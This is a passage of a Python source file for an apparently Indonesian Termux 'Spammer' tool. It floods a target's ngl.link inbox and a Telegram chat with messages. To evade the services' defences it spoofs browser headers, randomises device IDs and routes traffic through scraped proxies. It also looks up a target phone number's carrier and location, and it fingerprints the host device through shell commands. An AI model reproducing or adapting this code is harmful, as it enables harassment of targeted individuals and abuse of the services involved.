        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.1; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 11; Nokia G20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
    ]

def ngl_spam_sec_ch_ua(user_agent):
    if "Chrome/120" in user_agent:
        return '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'
    elif "Chrome/119" in user_agent:
        return '"Not_A Brand";v="8", "Chromium";v="119", "Google Chrome";v="119"'
    elif "Chrome/118" in user_agent:
        return '"Not_A Brand";v="8", "Chromium";v="118", "Google Chrome";v="118"'
    elif "Edge" in user_agent:
        return '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"'
    else:
        return '"Not_A Brand";v="99", "Chromium";v="120"'

def ngl_spam_proxy():
    try:
        url = "https://www.sslproxies.org/"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
        
        response = requests.get(url, headers=headers, timeout=10)
        soup = BeautifulSoup(response.content, 'html.parser')
        
        proxy_list = []
        table = soup.find('table', {'class': 'table table-striped table-bordered'})
        
        if table:
            rows = table.find('tbody').find_all('tr')
            for row in rows[:50]:
                cols = row.find_all('td')
                if len(cols) >= 2:
                    ip = cols[0].text.strip()
                    port = cols[1].text.strip()
                    proxy = f"http://{ip}:{port}"
                    proxy_list.append(proxy)
        
        if not proxy_list:
            proxy_list = [
                "http://103.152.112.162:80",
                "http://47.251.43.115:33333",
                "http://20.206.106.192:8123",
                "http://185.217.143.96:9090",
                "http://103.152.112.145:80"
            ]
        
        return proxy_list
    except:
        return [
            "http://103.152.112.162:80",
            "http://47.251.43.115:33333",
            "http://20.206.106.192:8123",
            "http://185.217.143.96:9090",
            "http://103.152.112.145:80"
        ]

def ngl_spam_devid():
    device_types = [
        f"{''.join(random.choices(string.hexdigits.lower(), k=16))}",
        f"web-{random.randint(100000000, 999999999)}",
        f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=32))}",
        f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}",
    ]
    return random.choice(device_types)

def ngl_spam_pesan_random(message):
    variations = [
        message,
        message + " ",
        " " + message,
        message + "  ",
        message.replace(" ", "  "),
    ]
    return random.choice(variations)

def ngl_spam_header(user_agent, username):
    is_mobile = "Mobile" in user_agent or "iPhone" in user_agent or "Android" in user_agent
    
    headers = {
        "Content-Type": "application/json",
        "User-Agent": user_agent,
        "Accept": "*/*",
        "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.9", "en-US,en;q=0.8"]),
        "Accept-Encoding": "gzip, deflate, br",
        "Origin": "https://ngl.link",
        "Referer": f"https://ngl.link/{username}",
        "DNT": "1",
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
    }
    
    if "Chrome" in user_agent or "Edge" in user_agent:
        headers["sec-ch-ua"] = ngl_spam_sec_ch_ua(user_agent)
        headers["sec-ch-ua-mobile"] = "?1" if is_mobile else "?0"
        headers["sec-ch-ua-platform"] = random.choice(['"Windows"', '"macOS"', '"Linux"', '"Android"'])
    
    header_order = list(headers.items())
    random.shuffle(header_order)
    
    return dict(header_order)

def ngl_spam_loading(stop_event, completed_ref, total):
    WARNA = [
        "\033[1;91m",
        "\033[1;93m",
        "\033[1;92m",
        "\033[1;94m",
    ]
    RESET = "\033[0m"
   
    length = 23
    color_index = 0
    
    print(f"""{a}╭─────────────────────────────────────────────────────────────╮
│{p} Sedang Mengirimkan {h}{total}{p} Pesan Secara Terus Menerus Ke NGL     {a}│
│{p} Target Dengan Cepat Tanpa Delay [[                       ]] {a}│
╰─────────────────────────────────────────────────────────────╯""")
    
    sys.stdout.write("\033[s")
    
    while not stop_event.is_set():
        for i in range(length + 1):
            if stop_event.is_set():
                break
                
            filled_color = WARNA[color_index % len(WARNA)] + "■" * i + RESET
            empty = "□" * (length - i)
            
            current = completed_ref[0]
            
            sys.stdout.write("\033[u")
            sys.stdout.write("\033[2A")
            sys.stdout.write("\033[36C")
            
            sys.stdout.write(f"\033[0m{filled_color}{empty}\033[0m")
            sys.stdout.flush()
            
            time.sleep(0.05)
            
            color_index += 1
    
    sys.stdout.write("\033[u")

def ngl_spam_send_pesan(username, message, proxy_list, session, task_number):
    url = "https://ngl.link/api/submit"
    
    user_agents = ngl_spam_ua()
    user_agent = random.choice(user_agents)
    
    headers = ngl_spam_header(user_agent, username)
    
    randomized_message = ngl_spam_pesan_random(message)
    
    payload_fields = [
        ("username", username),
        ("question", randomized_message),
        ("deviceId", ngl_spam_devid()),
        ("gameSlug", ""),
        ("referrer", ""),
    ]
    
    random.shuffle(payload_fields)
    payload = dict(payload_fields)
    
    proxy = random.choice(proxy_list)
    proxies = {
        "http": proxy,
        "https": proxy
    }
    
    try:
        response = session.post(
            url, 
            headers=headers, 
            json=payload, 
            proxies=proxies,
            timeout=10
        )
        
        if response.status_code == 200:
            return (task_number, True)
            
    except:
        try:
            response = session.post(
                url, 
                headers=headers, 
                json=payload,
                timeout=10
            )
            
            if response.status_code == 200:
                return (task_number, True)
        except:
            pass
    
    return (task_number, False)

def ngl_spam_main():
    print(f"""
{a}╭─────────────────────────────────────────────────────────────╮
│ {p}Masukkan Username NGL Target Tanpa "{h}@{p}". Contoh{m}:{h} MyTarget123 {a}│
╰── ╭─ {m}[{p} N G L {m}]{a} ─────────────────────────────────────────────╯""")
    
    username = input(f"    {a}╰──{h}➤{p} ").strip()
    
    if not username:
        input(f"\n{p} [{m}!{p}]{p} Username Ga Boleh Kosong{m} | {h} ENTER {r}")
        return
    
    jumlah = 30
    threads = 10
    
    confirm = input(f"\n {p}[{h}+{p}]{p} Silahkan {h}ENTER{r} {p}Atau Ketik {h}N{r} {p}Untuk Membatalkan{m} :{p} ").strip().lower()
    
    if confirm == 'n':
        return
    
    proxy_list = ngl_spam_proxy()
    
    sukses = 0
    gagal = 0
    lock = threading.Lock()
    completed = 0
    completed_ref = [0]
    stop_loading = threading.Event()
    
    def ngl_spam_worker(task_num):
        nonlocal sukses, gagal, completed
        
        random_messages = ngl_spam_pesan_acak()
        current_message = random.choice(random_messages)
        
        session = requests.Session()
        task_number, result = ngl_spam_send_pesan(
            username, current_message, proxy_list, session, task_num
        )
        
        with lock:
            completed += 1
            completed_ref[0] = completed
            if result:
                sukses += 1
            else:
                gagal += 1
    
    print()
   
    loading_thread = threading.Thread(target=ngl_spam_loading, args=(stop_loading, completed_ref, jumlah))
    loading_thread.daemon = True
    loading_thread.start()
    
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(ngl_spam_worker, i) for i in range(1, jumlah + 1)]
        
        for future in as_completed(futures):
            future.result()
    
    end_time = time.time()
    elapsed = end_time - start_time

    stop_loading.set()
    loading_thread.join()

    jarak_sukses = " " * (7 - len(str(sukses)))
    jarak_gagal = " " * (7 - len(str(gagal)))

    update_leaderboard(3)
    kirim_log_aktivitas("3 - Spam NGL Brutal", username)
    print(f"""{a}╭─────────────────────────────────────────────────────────────╮
│{p} Proses Pengiriman Selesai {m}|{p} Sukses{m}:{h} {sukses}{jarak_sukses} {m}|{p} Gagal{m}:{h} {gagal}{jarak_gagal}{a}│
╰─────────────────────────────────────────────────────────────╯""")
    input(f"\n {h}࿈{p} Kembali Ke Menu Spam {m}|{h} ENTER")

def tg_random_pesan():
    return [
        "Hey! Hope you're having a great day!",
        "Just wanted to say hello and check in with you.",
        "Thinking of you today. Hope everything is going well!",
        "You're awesome! Keep being amazing!",
        "Sending positive vibes your way!",
        "Hope your day is as wonderful as you are!",
        "Just a quick message to brighten your day!",
        "You've got this! Stay strong!",
        "Wishing you a fantastic day ahead!",
        "Keep smiling! You're doing great!",
        "Just wanted to remind you how awesome you are!",
        "Hope you're doing well! Take care!",
        "Sending good energy your way today!",
        "You're incredible! Don't forget that!",
        "Have an amazing day! You deserve it!",
        "Just checking in to say you're appreciated!",
        "Keep up the great work! You're killing it!",
        "Hope this message makes you smile!",
        "You're stronger than you think!",
        "Believe in yourself! You're amazing!"
    ]

def tg_variasi_pesan(message):
    variations = [
        message,
        message + " ",
        " " + message,
        message + "  ",
        message + "\n",
    ]
    return random.choice(variations)

def tg_send_pesan(bot_token, chat_id, message):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    
    payload = {
        'chat_id': chat_id,
        'text': message,
        'parse_mode': 'HTML'
    }
    
    try:
        response = requests.post(url, data=payload)
        result = response.json()
        return result.get('ok', False)
    except Exception as e:
        return False


def tg_send_poto(bot_token, chat_id, photo_url, caption):
    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    
    payload = {
        'chat_id': chat_id,
        'photo': photo_url,
        'caption': caption,
        'parse_mode': 'HTML'
    }
    
    try:
        response = requests.post(url, data=payload)
        result = response.json()
        return result.get('ok', False)
    except Exception as e:
        return False


def tg_loading_animasi(stop_event, completed_ref, total):
    COLORS = [
        "\033[1;91m",
        "\033[1;93m",
        "\033[1;92m",
        "\033[1;94m",
    ]
    RESET = "\033[0m"
   
    length = 23
    color_index = 0
    
    print(f"""{a}╭─────────────────────────────────────────────────────────────╮
│{p} Sedang Mengirimkan {h}{total}{p} Pesan Secara Terus Menerus Ke       {a}  │
│{p} Telegram Target Dengan Cepat [[                       ]]    {a}│
╰─────────────────────────────────────────────────────────────╯""")
    
    sys.stdout.write("\033[s")
    
    while not stop_event.is_set():
        for i in range(length + 1):
            if stop_event.is_set():
                break
                
            filled_color = COLORS[color_index % len(COLORS)] + "■" * i + RESET
            empty = "□" * (length - i)
            
            current = completed_ref[0]
            
            sys.stdout.write("\033[u")
            sys.stdout.write("\033[2A")
            sys.stdout.write("\033[33C")
            
            sys.stdout.write(f"\033[0m{filled_color}{empty}\033[0m")
            sys.stdout.flush()
            
            time.sleep(0.05)
            
            color_index += 1
    
    sys.stdout.write("\033[u")


def tg_main():
    print(f"""{a}
╭─────────────────────────────────────────────────────────────╮
│ {p}Masukkan Token BOT & ID Telegram Pemilik Token Bot Target {a}  │
╰── ──── {m}[{p} T E L E G R A M {m}]{a} ─────────────────────────────────╯""")
     
    BOT_TOKEN = getpass.getpass(f"\n {p}[{h}+{p}] Masukkan Token BOT {m}:{h} ").strip()
    
    CHAT_ID = input(f" {p}[{h}+{p}] Masukkan ID Telegram {m}:{h} ").strip()
    
    with_image = input(f" {p}[{h}+{p}] Spam Text + Gambar (Y/n) {m}:{h} ").strip().lower()
    
    photo_url = None
    if with_image == 'y':
        photo_url = input(f" {p}[{h}+{p}] Masukkan URL Gambar Anda {m}:{h} ").strip()
    
    message = input(f" {p}[{h}+{p}] Masukkan Pesan Anda {m}:{h} ").strip()
    
    count = 50
    
    confirm = input(f"\n {p}[{h}+{p}]{p} Silahkan {h}ENTER{r} {p}Atau Ketik {h}N{r} {p}Untuk Membatalkan{m} :{p} ").strip().lower()
    
    if confirm == 'n':
        return
    
    success_count = 0
    failed_count = 0
    lock = threading.Lock()
    completed = 0
    completed_ref = [0]
    stop_loading = threading.Event()
    
    def worker(task_num):
        nonlocal success_count, failed_count, completed
        
        if message:
            current_message = message
        else:
            random_messages = tg_random_pesan()
            current_message = random.choice(random_messages)
        
        varied_message = tg_variasi_pesan(current_message)
        
        if with_image == 'y':
            status = tg_send_poto(BOT_TOKEN, CHAT_ID, photo_url, varied_message)
        else:
            status = tg_send_pesan(BOT_TOKEN, CHAT_ID, varied_message)
        
        with lock:
            completed += 1
            completed_ref[0] = completed
            if status:
                success_count += 1
            else:
                failed_count += 1
        
        time.sleep(0.5)
    
    print()
    
    loading_thread = threading.Thread(target=tg_loading_animasi, args=(stop_loading, completed_ref, count))
    loading_thread.daemon = True
    loading_thread.start()
    
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = [executor.submit(worker, i) for i in range(1, count + 1)]
        
        for future in as_completed(futures):
            future.result()
    
    end_time = time.time()
    elapsed = end_time - start_time
    
    stop_loading.set()
    loading_thread.join()
    
    jarak_sukses = " " * (7 - len(str(success_count)))
    jarak_gagal = " " * (7 - len(str(failed_count)))
    
    update_leaderboard(4)
    kirim_log_aktivitas("4 - Spam BOT Telegram", CHAT_ID)
    print(f"""{a}╭─────────────────────────────────────────────────────────────╮
│{p} Proses Pengiriman Selesai {m}|{p} Sukses{m}:{h} {success_count}{jarak_sukses} {m}|{p} Gagal{m}:{h} {failed_count}{jarak_gagal}{a}│
╰─────────────────────────────────────────────────────────────╯""")
    input(f"\n {h}࿈{p} Kembali Ke Menu Spam {m}|{h} ENTER")

def nosint_cek_nomor(input_nomor):
    if not input_nomor or not input_nomor.strip():
        input(f"""
input(f"\n {p}[{m}!{p}] Nomor tidak boleh kosong!{m} |{h} ENTER")
""")
        return

    try:
        parsed = phonenumbers.parse(input_nomor, None)
    except NumberParseException as e:
        input(f"""
 {p}[{m}!{p}] Input Tidak Valid! {m}|{h} ENTER
""")
        return

    is_valid    = phonenumbers.is_valid_number(parsed)
    is_possible = phonenumbers.is_possible_number(parsed)

    fmt_e164          = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164)
    fmt_internasional = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
    fmt_nasional      = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.NATIONAL)
    fmt_rfc3966       = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.RFC3966)

    tipe_raw        = phonenumbers.number_type(parsed)
    tipe_nomor      = TIPE_NOMOR.get(tipe_raw, "Tidak Diketahui")
    nama_operator   = carrier.name_for_number(parsed, "id") or carrier.name_for_number(parsed, "en") or "Tidak Tersedia"
    lokasi          = geocoder.description_for_number(parsed, "id") or geocoder.description_for_number(parsed, "en") or "Tidak Tersedia"
    zona_waktu      = list(timezone.time_zones_for_number(parsed)) or ["Tidak Tersedia"]
    kode_negara_iso = phonenumbers.region_code_for_number(parsed)

    if is_valid:
        status = "Valid"
    elif is_possible:
        status = "Mungkin Valid"
    else:
        status = "Tidak Valid"
        
    update_leaderboard(6)

    jarak_status        = " " * (45 - len(str(status)))
    jarak_input         = " " * (40 - len(str(input_nomor)))
    jarak_e164          = " " * (45 - len(str(fmt_e164)))
    jarak_internasional = " " * (36 - len(str(fmt_internasional)))
    jarak_nasional      = " " * (41 - len(str(fmt_nasional)))
    jarak_rfc3966       = " " * (43 - len(str(fmt_rfc3966)))
    jarak_dial          = " " * (35 - len(str(parsed.country_code)) - 1)
    jarak_iso           = " " * (36 - len(str(kode_negara_iso)))
    jarak_subscriber    = " " * (35 - len(str(parsed.national_number)))
    jarak_ekstensi      = " " * (45 - len(str(json.dumps(parsed.extension))))
    jarak_tipe          = " " * (41 - len(str(tipe_nomor)))
    jarak_operator      = " " * (43 - len(str(nama_operator)))
    jarak_lokasi        = " " * (35 - len(str(lokasi)))
    jarak_zona          = " " * (43 - len(str(json.dumps(zona_waktu))))
    jarak_is_valid      = " " * (43 - len(str(is_valid).lower()))
    jarak_is_possible   = " " * (41 - len(str(is_possible).lower()))
    jarak_country_code  = " " * (39 - len(str(parsed.country_code)))
    jarak_nat_number    = " " * (37 - len(str(parsed.national_number)))

    h_cursor()
    print(f"""{a}
╭────────────────────── {m}[{p} R E S P O N {m}]{a} ──────────────────────╮{a}
│{p} {{                                                         {a}  │{a}
│  {p} "Status": "{status}",{jarak_status}{a}│
│ {p}  "Nomor_Input": "{input_nomor}",{jarak_input}{a}│{a}
│{p}   "Format" : {{                                  {a}            │{a}
│  {p}   "E164": "{fmt_e164}",{jarak_e164}{a}│
│ {p}    "Internasional": "{fmt_internasional}",{jarak_internasional}{a}│
│    {p} "Nasional": "{fmt_nasional}",{jarak_nasional}{a}│
│ {p}    "RFC3966": "{fmt_rfc3966}"{jarak_rfc3966}{a}│
│{p}   }},                                           {a}             │{a}
│{p}   "Kode_Negara_Dial": "+{parsed.country_code}",{jarak_dial}{a}│
│{p}   "Kode_Negara_ISO": "{kode_negara_iso}",{jarak_iso}{a}│
│{p}   "Nomor_Subscriber": "{parsed.national_number}",{jarak_subscriber}{a}│
│{p}   "Ekstensi": {json.dumps(parsed.extension)},{jarak_ekstensi}{a}│
│{p}   "Tipe_Nomor": "{tipe_nomor}",{jarak_tipe}{a}│
│{p}   "Operator": "{nama_operator}",{jarak_operator}{a}│
│{p}   "Lokasi_Perkiraan": "{lokasi}",{jarak_lokasi}{a}│
│{p}   "Zona_Waktu": {json.dumps(zona_waktu)},{jarak_zona}{a}│
│{p}   "Validasi" : {{                                       {a}     │{a}
│{p}     "Is_Valid": {str(is_valid).lower()},{jarak_is_valid}{a}│
│{p}     "Is_Possible": {str(is_possible).lower()}{jarak_is_possible}{a}│
│{p}   }},                                                        {a}│
│{p}   "Raw" : {{                                                 {a}│
│{p}     "Country_Code": {parsed.country_code},{jarak_country_code}{a}│
│{p}     "National_Number": {parsed.national_number}{jarak_nat_number}{a}│
│{p}   }},                                                        {a}│
│{p}   "Author_Website": "https://byexe.vercel.app"              {a}│
│{p} }}                                                           {a}│
╰─────────────────────────────────────────────────────────────╯""")
    input(f"""
╭─────────────────────────────────────────────────────────────╮
│ \033[101m     {r}{h}          >> {p}ENTER FOR BACK TO MENU{h} <<           \033[101m     {r} {a}│
╰─────────────────────────────────────────────────────────────╯
""")
    s_cursor()

def nosint_main():

    try:
        s_cursor()
        nomor = input(f"""
{a}╭─────────────────────────────────────────────────────────────╮
│{p} Masukkan Nomor Target Format Internasional. Contoh{m}:{h} +62×××× {a}│
╰── ╭─ {m}[{p} N O S I N T {m}]{a} ───────────────────────────────────────╯
   {a} ╰──{h}➤{p} """).strip()
    except (KeyboardInterrupt, EOFError):
        return

    if not nomor:
        h_cursor()
        input(f"\n {p}[{m}!{p}] Nomor tidak boleh kosong!{m} |{h} ENTER")
        s_cursor()
        return

    nosint_cek_nomor(nomor)


def nosint_run():
    if len(sys.argv) > 1:
        nosint_cek_nomor(sys.argv[1])
    else:
        nosint_main()
        
def cuser_ambil_data() -> dict:
    return get_user_database()


def cuser_tampilkan_users(data: dict) -> None:
    users = data.get("users", [])
    h_cursor()
    print(f"{a}\n╭──────────────────────── {m}[{p} U S E R {m}]{a} ────────────────────────╮")
    for user in users:
        name      = user.get("nama", "-")
        device_id = user.get("device_id", "-")
        device_id_sensor = device_id[:5] + "*" * (len(device_id) - 9) + device_id[-4:]
        jarak_nama        = " " * (17 - len(str(name)))
        jarak_id          = " " * (1 - len(str(device_id)))
        print(f"{a}│ {h}Nama{m}:{p} {name}{jarak_nama}   {m}   —     {h}ID{m}:{p} {device_id_sensor}{jarak_id} {a}│")
    print(f"{a}╰─────────────────────────────────────────────────────────────╯")
    input(f"""╭─────────────────────────────────────────────────────────────╮
│ \033[101m     {r}{h}          >> {p}ENTER FOR BACK TO MENU{h} <<           \033[101m     {r} {a}│
╰─────────────────────────────────────────────────────────────╯
""")
    s_cursor()


def cuser_main():
    data = cuser_ambil_data()
    cuser_tampilkan_users(data)
    
def get_user_database():
    try:
        url = f"{RAW_USER_DB}?t={int(time.time())}"

        response = requests.get(
            url,
            headers={
                "Cache-Control": "no-cache",
                "Pragma": "no-cache"
            },
            timeout=10
        )

        response.raise_for_status()

        return response.json()

    except:
        return {"users": []}


def get_user_data(device_id):
    db = get_user_database()

    for user in db.get("users", []):
        if user.get("device_id") == device_id:
            return user

    return None

def get_devid():
    try:
        import hashlib

        whoami = os.popen('whoami').read().strip()
        id_output = os.popen('id').read().strip()

        uid_match = re.search(r'uid=(\d+)', id_output)
        uid = uid_match.group(1) if uid_match else "0"

        ctx_match = re.search(r'context=([^\s]+)', id_output)
        ctx = ctx_match.group(1) if ctx_match else ""

        c_vals = re.findall(r'c(\d+)', ctx)
        c_str = ''.join(c_vals[:2]) if c_vals else ""

        mac = os.popen("ip link show 2>/dev/null | grep 'link/ether' | awk '{print $2}' | head -1").read().strip().replace(":", "")
        serial = os.popen("getprop ro.serialno 2>/dev/null").read().strip()
        android_id = os.popen("settings get secure android_id 2>/dev/null").read().strip()
        build_id = os.popen("getprop ro.build.id 2>/dev/null").read().strip()
        fingerprint = os.popen("getprop ro.build.fingerprint 2>/dev/null").read().strip()

        termux_home = os.path.expanduser("~")
        inode = str(os.stat(termux_home).st_ino) if os.path.exists(termux_home) else ""

        raw = f"{whoami}{uid}{c_str}{mac}{serial}{android_id}{build_id}{fingerprint}{inode}"
        raw = re.sub(r'[^a-zA-Z0-9]', '', raw)

        hashed = hashlib.sha256(raw.encode()).hexdigest()[:20]

        return hashed
    except:
        try:
            import hashlib
            fallback = os.popen('whoami').read().strip() + str(os.getuid())
            return hashlib.md5(fallback.encode()).hexdigest()[:20]
        except:
            return "unknown"

def jumlah_pengguna():
    global jumlah_user_cache

    try:
        data = get_user_database()

        total = len(data.get("users", []))
        jumlah_user_cache = total

        return total

    except:
        return jumlah_user_cache

def get_ip():
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        return response.json()["ip"]
    except:
        return "N/A"

def sensor_ip(ip):
    try:
        if ip == "N/A" or len(ip) < 5:
            return ip
        return ip[:-5] + "×" * 5
    except:
        return ip

def get_merek_hp():
    try:
        brand = os.popen('getprop ro.product.brand').read().strip()
        if brand:
            return brand
        model = os.popen('getprop ro.product.model').read().strip()
        if model:
            return model
        return "Unknown"
    except:
        return "Unknown"

def get_os():
    try:
        os_version = os.popen('getprop ro.build.version.release').read().strip()
        if os_version:
            return f"Android {os_version}"
        return "Unknown"
    except:
        return "Unknown"

def get_cpu():
    try:
        cpu_count = os.popen('cat /proc/cpuinfo | grep "processor" | wc -l').read().strip()
        
        cpu_freq = os.popen('cat /proc/cpuinfo | grep "cpu MHz" | head -n 1').read().strip()
        if cpu_freq and ':' in cpu_freq:
            freq_mhz = float(cpu_freq.split(':')[1].strip())
            freq_ghz = round(freq_mhz / 1000, 3)
        else:
            max_freq = os.popen('cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq').read().strip()
            if max_freq:
                freq_ghz = round(int(max_freq) / 1000000, 3)
            else:
                freq_ghz = "?"
        
        if cpu_count:
            return f"({cpu_count}) @ {freq_ghz}GHz"
        else:
            return "Unknown"
    except:
        return "Unknown"
        
def cek_sesi():
    try:
        if not os.path.exists(sesi_file):
            return False

        with open(sesi_file, 'r') as f:
            pid_lama = int(f.read().strip())

        try:
            os.kill(pid_lama, 0)
            return True
        except ProcessLookupError:
            hapus_sesi()
            return False
        except PermissionError:
            return True
    except:
        hapus_sesi()
        return False

def get_memory():
    try:
        meminfo = os.popen('cat /proc/meminfo | grep MemTotal').read().strip()
        if meminfo:
            mem_kb = int(meminfo.split()[1])
            mem_gb = round(mem_kb / (1024 * 1024), 2)
            return f"{mem_gb} GB"
        return "Unknown"
    except:
        return "Unknown"

def buat_sesi():
    try:
        with open(sesi_file, 'w') as f:
            f.write(str(os.getpid()))
    except:
        pass

def hapus_sesi():
    try:
        if not os.path.exists(sesi_file):
            return
        with open(sesi_file, 'r') as f:
            pid_tersimpan = int(f.read().strip())
        if pid_tersimpan == os.getpid():
            os.remove(sesi_file)
    except:
        pass

def cek_devid(device_id):
    try:
        data = get_user_database()

        for user in data.get("users", []):
            if user.get("device_id") == device_id:
                return True, user

        return False, None

    except:
        return None, None

def kontol_sinyal(sig, frame):
    return

def setup_kontol_sinyals():
    try:
        signal.signal(signal.SIGTSTP, kontol_sinyal)
        signal.signal(signal.SIGTERM, lambda s, f: (hapus_sesi(), sys.exit(0)))
        signal.signal(signal.SIGINT, lambda s, f: (hapus_sesi(), sys.exit(0)))
    except:
        pass

def clear():
    os.system('clear')

def leaderboardtutup():                                                                              
    input(f"\n  {p}[{m}!{p}] Leaderboard ditutup. Tunggu informasi dari Minby{m} |{h} ENTER")

def chatme():
    print(f"\n {h}⌗{p} Membuka Tautan Website Byexe{m},{p} Tunggu Sebentar")
    os.system("xdg-open 'https://byexe.vercel.app'")
    time.sleep(2)

def channelwa():
    print(f"\n {h}⌗{p} Membuka Tautan Channel{m},{p} Tunggu Sebentar")
    os.system("xdg-open 'https://whatsapp.com/channel/0029Vb8Czm0B4hdQ5pc3tv0m'")
    time.sleep(2)

def tampilkan_menu():
    user = jumlah_pengguna()
    ip_sensor = sensor_ip(ipaddress)
    pesanline1, pesanline2 = get_pesan_banner()

    jarak_line1 = " " * max(0, 59 - wcswidth(pesanline1))
    jarak_line2 = " " * max(0, 59 - wcswidth(pesanline2))
    jarak_ip = " " * (23 - len(str(ip_sensor)))
    jarak_id = " " * (22 - len(str(deviceid)))
    jarak_nama = " " * (19 - len(str(nama)))
    jarak_user = " " * (23 - len(str(user)))

    clear()
    s_cursor()
    print(f"""{a}
╭─────────────────────────────────────────────────────────────╮
│\033[1;35m  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                    {a} │
│\033[1;35m  ⠀⠀⠀⠀⠀⠀⢀⣠⣤⠞⢹⡏⠳⣤⣄⡀⠀⠀⠀⠀⠀⠀ {h}┌─┐┌┬┐┌─┐       ┌┐┌┌─┐─┐ ┬┬ ┬┌─┐   {a} │
│\033[1;35m  ⠰⣤⣀⠀⢀⡴⣫⣴⡇⠀⢸⡇⠀⠈⢦⣝⢦⡀⠀⣀⣤⠆ {h}│ │││││ ┬  {m}───{h}  │││├┤ ┌┴┬┘│ │└─┐   {a} │
│\033[1;35m  ⠀⢷⠀⠉⠛⠾⣿⣿⡇⠀⢸⡇⠀⢀⠀⠙⠷⠛⠉⠀⡾⠀ {h}└─┘┴ ┴└─┘       ┘└┘└─┘┴ └─└─┘└─┘   {a} │
│\033[1;35m  ⠀⠘⡄⠀⢠⡀⠀⢿⡇⠀⢸⡇⠀⠈⠉⠀⣀⡄⠀⢠⠃⠀{a}──────────────────────────────────  {a} │
│\033[1;35m  ⠀⠀⢳⡀⠀⣷⠀⠘⡇⠀⢸⡇⡀⢤⣶⣿⠟⠀⢀⡞⠀⠀                                    {a} │
│\033[1;35m  ⠀⠀⠈⣟⣦⠸⡆⠀⠁⠀⢸⡏⠀⢸⠿⠁⠀⣴⣻⠁⠀  {h} ꫝ{p} Author  {m}: {h}Byexe                 {a} │
│\033[1;35m  ⠀⠀⠀⠹⣌⢷⣿⡀⠀⠀⢸⡇⠀⠈⠀⣠⡾⣡⠏⠀⠀⠀ {h} ꫝ{p} Name    {m}: {h}Spammer               {a} │
│\033[1;35m  ⠀⠀⠀⠀⠈⠳⣝⠣⡄⠀⢸⡇⠀⢠⠜⣫⠞⠁     {h} ꫝ{p} Version {m}: {h}3.0.9                 {a} │
│\033[1;35m  ⠀⠀⠀⠀⠀⠀⠈⠙⠛⢦⣸⡇⡴⠛⠋⠁⠀      {h} ꫝ{p} Users   {m}: {h}{user}{jarak_user}{a}│
│\033[1;35m  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⠏⠀⠀⠀⠀⠀                                         {a} │
╰─────────────────────────────────────────────────────────────╯
╭──────────────────────────────╮╭─────────────────────────────╮
│ {h}IP {m}:{p} {ip_sensor}{jarak_ip}{a} ││ {h}NAME   {m}:{p} {nama}{jarak_nama}{a}│
│ {h}ID {m}:{p} {deviceid}{jarak_id} {a} ││ {h}STATUS {m}:{p} Premium            {a}│
╰──────────────────────────────╯╰─────────────────────────────╯
